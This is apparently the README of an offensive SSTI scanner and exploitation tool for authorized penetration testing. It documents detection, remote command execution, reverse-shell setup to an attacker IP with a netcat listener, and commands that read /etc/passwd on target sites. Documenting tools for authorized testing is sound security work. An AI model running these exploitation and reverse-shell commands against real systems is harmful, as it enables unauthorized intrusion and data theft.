# 👻 GHOSSSTI
## Ghost Ops Server-Side Template Injection Tool

**Advanced SSTI Detection, Identification & Exploitation Framework**

*For Ghost Ops Security - Authorized Penetration Testing Only*
*ghostops-security.com*
```
                    👻 GHOSSSTI 👻
     Ghost Ops Server-Side Template Injection
```

## Overview

GHOSSSTI is a comprehensive SSTI vulnerability scanner and exploitation framework supporting 14+ template engines. Built by Ghost Ops Security for professional penetration testing.

## Features

✅ 14+ Template Engine Support  
✅ Automatic Detection & Identification  
✅ Remote Code Execution (RCE)  
✅ Reverse Shell Generation  
✅ Interactive Command Mode  
✅ Proxy Support (Burp/ZAP)  
✅ Full Authentication Support  

## Quick Start

```bash
# Install
pip3 install -r requirements.txt
chmod +x ghosssti.py

# Basic scan
./ghosssti.py -u "http://target.com/page" -p name

# RCE
./ghosssti.py -u "http://target.com/page" -p name --exploit-cmd "whoami"

# Reverse shell
./ghosssti.py -u "http://target.com/page" -p name --exploit-shell 10.10.14.5 4444

# Interactive
./ghosssti.py -u "http://target.com/page" -p name --interactive
```

## Supported Engines

| Engine | Language | Framework |
|--------|----------|-----------|
| Jinja2 | Python | Flask, Django |
| Twig | PHP | Symfony |
| Freemarker | Java | Spring |
| Velocity | Java | Apache |
| Smarty | PHP | Legacy |
| Mako | Python | Pyramid |
| Pug/Jade | Node.js | Express |
| ERB | Ruby | Rails |
| Tornado | Python | Tornado |
| Django | Python | Django |
| Handlebars | Node.js | Express |
| Thymeleaf | Java | Spring Boot |
| Nunjucks | Node.js | Mozilla |
| Jade | Node.js | Legacy |

## Usage

### Detection
```bash
# Specific parameter
./ghosssti.py -u "http://target.com/page" -p username

# Auto-detect
./ghosssti.py -u "http://target.com/search"

# POST method
./ghosssti.py -u "http://target.com/api" -p content -m POST

# Through Burp
./ghosssti.py -u "http://target.com/page" -p name --proxy http://127.0.0.1:8080
```

### Authentication
```bash
# Cookies
./ghosssti.py -u "http://target.com/page" -p name -c "session=abc123"

# Bearer token
./ghosssti.py -u "http://target.com/page" -p name \
  -H "Authorization: Bearer TOKEN"

# Multiple
./ghosssti.py -u "http://target.com/page" -p name \
  -c "session=abc" -H "X-API-Key: secret"
```

### Exploitation
```bash
# Command execution
./ghosssti.py -u "http://target.com/page" -p name --exploit-cmd "id"
./ghosssti.py -u "http://target.com/page" -p name --exploit-cmd "cat /etc/passwd"

# Reverse shell (start nc -lvnp 4444 first)
./ghosssti.py -u "http://target.com/page" -p name --exploit-shell YOUR_IP 4444
```

### Interactive Mode
```bash
./ghosssti.py -u "http://target.com/page" -p name --interactive
```

Commands:
```
SSTI> cmd id
SSTI> cmd cat /etc/passwd
SSTI> shell 10.10.14.5 4444
SSTI> quit
```

## Command Reference

**Required:**
- `-u, --url URL` - Target URL

**Optional:**
- `-p, --parameter PARAM` - Parameter (auto-detect if omitted)
- `-m, --method {GET,POST}` - HTTP method
- `-d, --data DATA` - POST data
- `-H, --headers HEADERS` - Custom headers
- `-c, --cookies COOKIES` - Cookies
- `--proxy URL` - Proxy URL
- `--timeout SEC` - Timeout
- `--threads NUM` - Threads

**Exploitation:**
- `--exploit-cmd CMD` - Execute command
- `--exploit-shell IP PORT` - Reverse shell
- `--interactive` - Interactive mode
- `--detect-only` - Detection only

**Utility:**
- `--generate-payloads FILE` - Generate payloads

## Workflow

```bash
# 1. Discovery
./ghosssti.py -u "http://target.com/search" --proxy http://127.0.0.1:8080

# 2. Verify
./ghosssti.py -u "http://target.com/page" -p query --detect-only

# 3. Exploit
./ghosssti.py -u "http://target.com/page" -p query --exploit-cmd "id"

# 4. Interactive
./ghosssti.py -u "http://target.com/page" -p query --interactive
```

## Legal Notice

⚠️ **AUTHORIZED USE ONLY**

This tool is for:
- Professional pentesting (written authorization)
- Bug bounty programs (in scope)
- Security research (controlled environments)
- CTF competitions

Ghost Ops Security assumes no liability for misuse.

## Pro Tips

1. **Always use proxy** for traffic capture and documentation
2. **Start with --detect-only** for safer testing
3. **Document everything** - screenshots and output
4. **Generate payloads** for manual testing with other tools

## Troubleshooting

**No detection?**
- Increase timeout: `--timeout 30`
- Try different parameters
- Check in Burp for filtering

**Detection but no exploit?**
- Use `--interactive` mode
- Try alternative payload chains
- Engine may have restrictions

## Version

v1.0 - Initial Release
- 14 template engines
- Full detection & exploitation
- Interactive mode

---

👻 **Ghost Ops Security** - Professional Penetration Testing Tools

*Always obtain proper authorization before testing!*
